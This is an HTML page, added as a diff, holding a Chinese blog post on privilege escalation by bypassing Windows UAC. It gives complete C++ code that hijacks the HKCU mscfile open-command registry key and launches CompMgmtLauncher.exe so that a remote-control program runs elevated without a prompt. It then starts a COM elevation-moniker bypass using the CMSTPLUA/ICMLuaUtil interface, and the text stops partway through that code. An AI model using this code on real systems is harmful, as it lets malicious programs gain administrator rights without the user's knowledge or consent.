@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。
+话不多说，总结本次的提权办法——绕过UAC。
+1 UAC UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。
+然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。
+当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。
+如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。
+不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。
+2 绕过UAC 根据参考文章［１］所述，	触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：
+该函数首选验证路径是否在白名单中 接着将结果传递给consent.exe进程 该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认 UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。 对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。
+2.1 基于白名单的Bypass　UAC 有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。
+针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。
+我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：
+#include &amp;lt;Windows.h&amp;gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // 创建项 ::RegCreateKeyEx(HKEY_CURRENT_USER, &amp;#34;Software\\Classes\\mscfile\\Shell\\Open\\Command&amp;#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;amp;hKey, NULL); // 设置键值 ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 &#43; ::lstrlen(lpszExePath))); // 关闭注册表 ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // 关闭文件重定位 ::Wow64DisableWow64FsRedirection(&amp;amp;OldValue); // 修改注册表，设置我们的程序为启动目标 bRet = SetReg(&amp;#34;F:\\RemoteCtrl_Win10.'><title>提权技术--绕过UAC</title>
+
+<link rel='canonical' href='https://xrg.fj.cn/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/'>
+
+<link rel="stylesheet" href="/scss/style.min.744aa3042babb8291bcb36af694eb272f909f9b1e9c66387395b00d22da84726.css"><script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+<script>
+    
+    $(window).scroll(function() {
+    if ($(this).scrollTop()) {
+        $('#back-to-top').fadeIn();
+    } else {
+        $('#back-to-top').fadeOut();
+    }
+    });
+
+    
+    $('#back-to-top').click(function() {
+    $('html, body').animate({scrollTop: 0}, 1000);
+    return false;
+    });
+</script>
+
+<meta property='og:title' content='提权技术--绕过UAC'>
+<meta property='og:description' content='最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。
+话不多说，总结本次的提权办法——绕过UAC。
+1 UAC UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。
+然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。
+当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。
+如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。
+不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。
+2 绕过UAC 根据参考文章［１］所述，	触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：
+该函数首选验证路径是否在白名单中 接着将结果传递给consent.exe进程 该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认 UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。 对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。
+2.1 基于白名单的Bypass　UAC 有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。
+针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。
+我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：
+#include &amp;lt;Windows.h&amp;gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // 创建项 ::RegCreateKeyEx(HKEY_CURRENT_USER, &amp;#34;Software\\Classes\\mscfile\\Shell\\Open\\Command&amp;#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;amp;hKey, NULL); // 设置键值 ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 &#43; ::lstrlen(lpszExePath))); // 关闭注册表 ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // 关闭文件重定位 ::Wow64DisableWow64FsRedirection(&amp;amp;OldValue); // 修改注册表，设置我们的程序为启动目标 bRet = SetReg(&amp;#34;F:\\RemoteCtrl_Win10.'>
+<meta property='og:url' content='https://xrg.fj.cn/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/'>
+<meta property='og:site_name' content='XR_G&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='网络安全' /><meta property='article:published_time' content='2020-12-28T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-12-28T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="提权技术--绕过UAC">
+<meta name="twitter:description" content="最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。
+话不多说，总结本次的提权办法——绕过UAC。
+1 UAC UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。
+然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。
+当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。
+如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。
+不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。
+2 绕过UAC 根据参考文章［１］所述，	触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：
+该函数首选验证路径是否在白名单中 接着将结果传递给consent.exe进程 该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认 UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。 对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。
+2.1 基于白名单的Bypass　UAC 有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。
+针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。
+我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：
+#include &amp;lt;Windows.h&amp;gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // 创建项 ::RegCreateKeyEx(HKEY_CURRENT_USER, &amp;#34;Software\\Classes\\mscfile\\Shell\\Open\\Command&amp;#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;amp;hKey, NULL); // 设置键值 ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 &#43; ::lstrlen(lpszExePath))); // 关闭注册表 ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // 关闭文件重定位 ::Wow64DisableWow64FsRedirection(&amp;amp;OldValue); // 修改注册表，设置我们的程序为启动目标 bRet = SetReg(&amp;#34;F:\\RemoteCtrl_Win10.">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page has-toc
+">
+        <div id="loading-box">
+                
+                <div class="loading-left-bg"></div>
+                <div class="loading-right-bg"></div>
+                
+                <div class="spinner-box">
+                        <div class="configure-border-1">
+                                <div class="configure-core"></div>
+                        </div>
+                        <div class="configure-border-2">
+                                <div class="configure-core"></div>
+                        </div>
+                        <div class="loading-word">加载中...</div>
+                </div>
+      </div>
+      
+      <script>
+        $(document).ready(function () {
+                
+                document.getElementById('loading-box').classList.add("loaded")
+        })
+      </script>
+
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                网络安全
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/">提权技术--绕过UAC</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 28, 2020</time>
+            </div>
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <p>最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。</p>
+<p>话不多说，总结本次的提权办法——绕过UAC。</p>
+<h3 id="1-uac">1 UAC</h3>
+<blockquote>
+<p>UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。</p>
+<p>然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。</p>
+<p>当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。</p>
+<p>如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。</p>
+<p>不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。</p>
+</blockquote>
+<h3 id="2-绕过uac">2 绕过UAC</h3>
+<blockquote>
+<p>根据参考文章［１］所述，	触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：</p>
+<ul>
+<li>该函数首选验证路径是否在白名单中</li>
+<li>接着将结果传递给consent.exe进程</li>
+<li>该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认</li>
+<li>UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。</li>
+</ul>
+<p>对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。</p>
+<hr>
+<h5 id="21-基于白名单的bypassuac">2.1 基于白名单的Bypass　UAC</h5>
+<blockquote>
+<p>有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。</p>
+<p>针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。</p>
+<p>我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">SetReg</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">lpszExePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HKEY</span> <span class="n">hKey</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1">// 创建项
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">::</span><span class="n">RegCreateKeyEx</span><span class="p">(</span><span class="n">HKEY_CURRENT_USER</span><span class="p">,</span> <span class="s">&#34;Software</span><span class="se">\\</span><span class="s">Classes</span><span class="se">\\</span><span class="s">mscfile</span><span class="se">\\</span><span class="s">Shell</span><span class="se">\\</span><span class="s">Open</span><span class="se">\\</span><span class="s">Command&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">KEY_WOW64_64KEY</span> <span class="o">|</span> <span class="n">KEY_ALL_ACCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hKey</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 设置键值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">::</span><span class="n">RegSetValueEx</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">lpszExePath</span><span class="p">,</span> <span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="o">::</span><span class="n">lstrlen</span><span class="p">(</span><span class="n">lpszExePath</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 关闭注册表
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">::</span><span class="n">RegCloseKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">bRet</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">OldValue</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 关闭文件重定位
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">::</span><span class="n">Wow64DisableWow64FsRedirection</span><span class="p">(</span><span class="o">&amp;</span><span class="n">OldValue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 修改注册表，设置我们的程序为启动目标
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">bRet</span> <span class="o">=</span> <span class="n">SetReg</span><span class="p">(</span><span class="s">&#34;F:</span><span class="se">\\</span><span class="s">RemoteCtrl_Win10.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 运行 CompMgmtLauncher.exe
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;CompMgmtLauncher.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Run OK!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 恢复文件重定位
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">::</span><span class="n">Wow64RevertWow64FsRedirection</span><span class="p">(</span><span class="n">OldValue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>然而，修改注册表的提权方式过于简陋，会被WinDefender拦截下来。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 128; 
+			flex-basis: 307px"
+	>
+	<a href="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/UAC1.png" data-size="602x470">
+		<img src="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/UAC1.png"
+			width="602"
+			height="470"
+			srcset="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/UAC1_hu04ebefb6f76c4aed95f1f126051a7c4a_27226_480x0_resize_box_3.png 480w, /p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/UAC1_hu04ebefb6f76c4aed95f1f126051a7c4a_27226_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="被识别的行为">
+	</a>
+	
+	<figcaption>被识别的行为</figcaption>
+	
+</figure></p>
+<p>运行的结果也就不放了。程序会直接被杀死（Defender甚至把我的目标exe给删了）。</p>
+</blockquote>
+<hr>
+<h5 id="22-基于com组件接口的bypassuac">2.2 基于COM组件接口的Bypass　UAC</h5>
+<blockquote>
+<p>我对于COM的理解实际上不够清晰和深入，有兴趣的可以去看看参考文章[1~3]。</p>
+<p>从我的理解来看，COM（Component Object Model，组件对象模型）是一种更加严格的面向对象编程规范，遵守这一规范的二进制程序需要提供标准的接口来供其他程序调用。这种程序以“组件”的方式存在，可以被复用，故节省了内存；而且，由于这些组件独立存在，对它们本身做出的改动不会影响使用者的程序结构，方便了它们的功能升级。</p>
+<p>COM提升名称（COM Elevation Moniker）技术允许运行在用户帐户控制（UAC）下的应用程序，以提升权限的方法来激活COM类，最终提升COM接口权限。简单地说，就是主调程序以COM的规范实例化一个具有管理员权限的组件，这样这个组件的功能函数就能运行在管理员权限下。此外，COM规定了一个ICMLuaUtil接口，其下有一个ShellExcute方法，能够启动任意的程序。</p>
+<p>文章[1]还指出，如果执行COM提升名称代码的程序身份是不可信的，则会触发UAC弹窗；若可信，则不会触发UAC弹窗。所以，要想Bypass UAC，则需要想办法让这段代码在Windows的可信程序中运行。其中，可信程序有计算器、记事本、资源管理器、rundll32.exe等。</p>
+<p>我们仅仅希望以管理员权限启动我们的远控程序，则直接制作一个DLL交给rundll32.exe运行即可。按照上面的思路，我们的DLL应该先实例化一个管理员权限的COM组件，这个提权后的组件调用ShellExcute来启动远控程序。</p>
+<p>DLL项目的代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">// File: CBypassUAC.h
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#pragma once
+</span></span></span><span class="line"><span class="cl"><span class="cp">#ifndef BYPASS_UAC_H
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define BYPASS_UAC_H
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;windows.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;objbase.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;strsafe.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define CLSID_CMSTPLUA                     L&#34;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define IID_ICMLuaUtil                     L&#34;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="n">interface</span> <span class="n">ICMLuaUtil</span> <span class="n">ICMLuaUtil</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">ICMLuaUtilVtbl</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="n">BEGIN_INTERFACE</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">QueryInterface</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__RPC__in</span> <span class="n">REFIID</span> <span class="n">riid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="n">_COM_Outptr_</span>  <span class="kt">void</span><span class="o">**</span> <span class="n">ppvObject</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ULONG</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">AddRef</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ULONG</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Release</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method1</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method2</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method3</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method4</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
